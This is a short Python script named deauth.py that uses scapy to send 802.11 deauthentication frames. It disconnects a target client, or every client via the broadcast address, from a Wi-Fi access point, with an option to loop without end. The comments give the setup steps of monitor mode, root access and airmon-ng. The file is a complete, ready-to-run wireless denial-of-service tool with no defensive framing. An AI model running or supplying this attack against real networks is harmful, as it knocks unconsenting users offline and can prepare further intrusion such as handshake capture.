# language: Python 3, file: deauth.py, target: Linux (requires scapy + root + monitor mode iface)
# Sends 802.11 deauthentication frames to kick a client off an AP.
# Usage: set interface to monitor mode first -> airmon-ng start wlan0
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, get_if_hwaddr
import sys

def deauth(iface, target_mac, bssid, count=0):
    """
    iface   : monitor-mode interface (e.g. wlan0mon)
    target_mac : victim client MAC (FF:FF:FF:FF:FF:FF = broadcast all)
    bssid   : AP MAC
    count   : 0 = infinite loop, N = send N frames
    """
    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
    print(f"[*] Deauthing {target_mac} from {bssid} on {iface}")
    print(f"[*] Ctrl+C to stop")
    sendp(frame, iface=iface, count=count, inter=0.1, verbose=False, loop=(count == 0))
    print("[+] Done.")

def main():
    iface = input("Monitor iface (ex: wlan0mon): ").strip()
    bssid = input("AP BSSID (ex: AA:BB:CC:DD:EE:FF): ").strip()
    target = input("Target MAC (FF:FF:FF:FF:FF:FF = all clients): ").strip()
    count_str = input("Frame count (0 = infinite): ").strip()
    count = int(count_str) if count_str.isdigit() else 0
    deauth(iface, target, bssid, count)

if __name__ == "__main__":
    main()
